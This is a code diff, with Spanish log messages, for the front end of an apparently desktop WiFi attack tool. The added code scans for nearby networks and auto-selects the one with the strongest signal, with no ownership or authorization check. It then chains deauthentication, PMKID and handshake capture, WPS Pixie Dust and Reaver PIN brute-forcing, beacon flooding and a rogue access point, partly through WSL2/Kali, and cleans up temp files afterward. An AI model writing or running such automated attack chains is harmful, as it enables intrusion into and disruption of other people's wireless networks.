@@ -307,6 +307,46 @@ function selectedChannel() {
   return undefined;
 }
 
+function autoSelectStrongest() {
+  if (!lastNets.length) {
+    log('Primero escanea redes para seleccionar automáticamente el objetivo más fuerte.', 'warn');
+    return null;
+  }
+  const strongest = lastNets.reduce((a, b) => (a.signal ?? -1) > (b.signal ?? -1) ? a : b);
+  const sel = document.getElementById('attack-bssid');
+  if (sel) {
+    sel.value = strongest.bssid || '';
+    log(`Objetivo auto-seleccionado: ${strongest.ssid || 'Red oculta'} (${strongest.bssid}) · ${strongest.signal}% · CH${strongest.channel || '?'} · ${strongest.security}`, 'ok');
+  }
+  return strongest.bssid || null;
+}
+
+window.scanAndAutoAttack = async function () {
+  const btn = document.getElementById('scanBtn');
+  if (btn) { btn.disabled = true; btn.textContent = 'Escaneando…'; }
+  log('Escaneo automático previo al auto-ataque…', 'warn');
+  try {
+    const result = await window.__invoke('scan_wifi');
+    const nets = result?.networks || [];
+    lastNets = [...nets];
+    syncTargetList();
+    renderHeader(`${nets.length} redes encontradas`);
+    renderRows(nets);
+    if (!nets.length) {
+      log('No se encontraron redes. No se puede iniciar auto-ataque.', 'warn');
+      return;
+    }
+    const bssid = autoSelectStrongest();
+    if (!bssid) return;
+    await window.startAutoAttack();
+  } catch (err) {
+    log('Scan & Auto-Attack error: ' + err, 'error');
+  } finally {
+    const btn = document.getElementById('scanBtn');
+    if (btn) { btn.disabled = false; btn.textContent = '&#8635; Escanear ahora'; }
+  }
+};
+
 // ── Attack invocations ──────────────────────────────────────────────────────
 window.capturePmkid = async function () {
   const bssid = getSelectedBssid(); if (!bssid) return;
@@ -649,6 +689,20 @@ window.doListProcs = async function () {
   }
 };
 
+window.doCleanup = async function () {
+  const bssid = getSelectedBssid();
+  log('Limpiando temporales de captura…', 'info');
+  try {
+    const result = await window.__invoke('cleanup_temp_files', { bssid: bssid || undefined, keepResults: true });
+    if (result) {
+      log(`Limpieza completada: ${result.deleted.length} eliminados, ${result.kept.length} conservados.`, 'ok');
+      if (result.errors.length) log('Errores: ' + result.errors.join('; '), 'warn');
+    }
+  } catch (err) {
+    log('[cleanup] FATAL: ' + err, 'error');
+  }
+};
+
 // ── Init ─────────────────────────────────────────────────────────────────────
 window.showTab('scan');
 
@@ -701,6 +755,16 @@ window.autoAttack = async function () {
   currentAttackId = null;
   showProgress(false);
   window._autoStop = false;
+
+  try {
+    const cleanup = await window.__invoke('cleanup_temp_files', { bssid, keepResults: true });
+    if (cleanup) {
+      log(`Limpieza: ${cleanup.deleted.length} archivos eliminados, ${cleanup.kept.length} conservados.`, 'info');
+      if (cleanup.errors.length) log('Errores limpieza: ' + cleanup.errors.join('; '), 'warn');
+    }
+  } catch (e) {
+    log('Limpieza pos-ataque falló: ' + e, 'warn');
+  }
 
   log('========================================', 'ok');
   log('  AUTO-ATTACK COMPLETADO', 'ok');
@@ -772,12 +836,15 @@ window.doInteractive = async function () {
 // Auto-attack maestro 8 pasos
 window.startAutoAttack = async function () {
   const bssid = getSelectedBssid();
-  if (!bssid) return;
+  if (!bssid) {
+    log('Auto-ataque: sin BSSID. Escanea primero o usa Scan + Auto Ataque.', 'warn');
+    return;
+  }
   const wordlist = valOrEmpty(document.getElementById('auto-wordlist').value) || undefined;
   const iface    = valOrEmpty(document.getElementById('auto-iface').value) || undefined;
 
   log('==============================', 'warn');
-  log(' AUTO-ATTACK 8 PASOS INICIADO', 'warn');
+  log(' AUTO-ATTACK INICIADO', 'warn');
   log(' Objetivo: ' + bssid, 'warn');
   log(' Wordlist: ' + (wordlist || 'por defecto'), 'warn');
   log('==============================', 'warn');
@@ -785,17 +852,57 @@ window.startAutoAttack = async function () {
   const autoCh9 = selectedChannel();
   const clean9 = bssid.replace(/:/g, '');
 
-  const steps = [
-    { n: '1/9 - Deauth ligero', cmd: 'deauth_inject', args: { bssid, clientMac: undefined, count: 3, iface }, bgId: null },
-    { n: '2/9 - Capturar PMKID', cmd: 'pmkid_capture_bg', args: { bssid, channel: autoCh9, durationSeconds: 60 }, bgId: `pmkid_${clean9}` },
-    { n: '3/9 - Deauth fuerte', cmd: 'deauth_inject', args: { bssid, clientMac: undefined, count: 10, iface }, bgId: null },
-    { n: '4/9 - Capturar Handshake', cmd: 'capture_handshake_bg', args: { bssid, essid: undefined, channel: autoCh9, durationSeconds: 120 }, bgId: `handshake_${clean9}` },
-    { n: '5/9 - WPS Pixie Dust', cmd: 'wps_pixiedust_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpspix_${clean9}` },
-    { n: '6/9 - WPS PIN Bruteforce', cmd: 'wps_bruteforce_reaver_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpsr_${clean9}` },
-    { n: '7/9 - WPS PBC Attack', cmd: 'wps_pbc_attack_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpspbc_${clean9}` },
-    { n: '8/9 - Beacon Flood', cmd: 'beacon_flood', args: { essid: 'TEST', bssid, channel: autoCh9 || 1, beaconCount: 20 }, bgId: null },
-    { n: '9/9 - Rogue AP', cmd: 'rogue_ap', args: { essid: 'TEST_FREE_WIFI', bssid, channel: autoCh9 || 1, iface }, bgId: null },
-  ];
+  let useWsl = false;
+  try {
+    const wslCheck = await window.__invoke('wsl_is_available');
+    if (wslCheck && wslCheck.success) {
+      useWsl = true;
+      log('WSL2/Kali detectado: se usará para ataques que requieren inyección.', 'info');
+    } else {
+      log('WSL2/Kali no disponible: se usará solo ruta Windows nativa.', 'warn');
+    }
+  } catch (e) {
+    log('No se pudo verificar WSL2: ' + e, 'warn');
+  }
+
+  if (useWsl) {
+    const busidEl = document.getElementById('wsl-busid');
+    const busid = busidEl ? busidEl.value.trim() : '1-5';
+    log('Auto-attach USB a Kali (busid=' + busid + ')…', 'info');
+    try {
+      const attach = await window.__invoke('wsl_attach', { busid });
+      if (attach && attach.success) {
+        log('USB attach a Kali OK.', 'ok');
+      } else {
+        log('USB attach falló: ' + (attach ? attach.message : 'error'), 'warn');
+      }
+    } catch (e) {
+      log('USB attach error: ' + e, 'warn');
+    }
+  }
+
+  const steps = [];
+  if (useWsl) {
+    steps.push(
+      { n: '1/9 - PMKID (Kali)', cmd: 'wsl_pmkid_capture', args: { iface: 'wlan0', channel: autoCh9 || 11, durationSecs: 60 }, bgId: null },
+      { n: '2/9 - Wash (Kali)', cmd: 'wsl_wash', args: { iface: 'wlan0', channel: autoCh9 || 11, durationSecs: 20 }, bgId: null },
+      { n: '3/9 - Deauth (Kali)', cmd: 'wsl_deauth', args: { iface: 'wlan0', bssid, count: 10, channel: autoCh9 || 11 }, bgId: null },
+      { n: '4/9 - Reaver (Kali)', cmd: 'wsl_reaver', args: { iface: 'wlan0', bssid, channel: autoCh9 || 11, durationSecs: 60, pixie: false }, bgId: null },
+      { n: '5/9 - Convertir/crack (Win)', cmd: 'list_crack_assets', args: {}, bgId: null }
+    );
+  } else {
+    steps.push(
+      { n: '1/9 - Deauth ligero', cmd: 'deauth_inject', args: { bssid, clientMac: undefined, count: 3, iface }, bgId: null },
+      { n: '2/9 - Capturar PMKID', cmd: 'pmkid_capture_bg', args: { bssid, channel: autoCh9, durationSeconds: 60 }, bgId: `pmkid_${clean9}` },
+      { n: '3/9 - Deauth fuerte', cmd: 'deauth_inject', args: { bssid, clientMac: undefined, count: 10, iface }, bgId: null },
+      { n: '4/9 - Capturar Handshake', cmd: 'capture_handshake_bg', args: { bssid, essid: undefined, channel: autoCh9, durationSeconds: 120 }, bgId: `handshake_${clean9}` },
+      { n: '5/9 - WPS Pixie Dust', cmd: 'wps_pixiedust_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpspix_${clean9}` },
+      { n: '6/9 - WPS PIN Bruteforce', cmd: 'wps_bruteforce_reaver_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpsr_${clean9}` },
+      { n: '7/9 - WPS PBC Attack', cmd: 'wps_pbc_attack_bg', args: { bssid, iface, channel: autoCh9 }, bgId: `wpspbc_${clean9}` },
+      { n: '8/9 - Beacon Flood', cmd: 'beacon_flood', args: { essid: 'TEST', bssid, channel: autoCh9 || 1, beaconCount: 20 }, bgId: null },
+      { n: '9/9 - Rogue AP', cmd: 'rogue_ap', args: { essid: 'TEST_FREE_WIFI', bssid, channel: autoCh9 || 1, iface }, bgId: null }
+    );
+  }
 
   window._autoStop = false;
   showProgress(true);
@@ -805,12 +912,22 @@ window.startAutoAttack = async function () {
     if (btn) btn.textContent = step.n;
     updateProgress(10 + Math.round(80 * steps.indexOf(step) / steps.length), step.n);
     log('[' + step.n + ']...', 'warn');
-    currentAttackId = step.bgId; // cancelable con ■ Cancelar
+    currentAttackId = step.bgId;
     await invokeAttack(step.cmd, step.args);
   }
   currentAttackId = null;
   showProgress(false);
   window._autoStop = false;
+
+  try {
+    const cleanup = await window.__invoke('cleanup_temp_files', { bssid, keepResults: true });
+    if (cleanup) {
+      log(`Limpieza: ${cleanup.deleted.length} archivos eliminados, ${cleanup.kept.length} conservados.`, 'info');
+      if (cleanup.errors.length) log('Errores limpieza: ' + cleanup.errors.join('; '), 'warn');
+    }
+  } catch (e) {
+    log('Limpieza pos-ataque falló: ' + e, 'warn');
+  }
 
   log('==============================', 'ok');
   log(' AUTO-ATTACK COMPLETADO', 'ok');
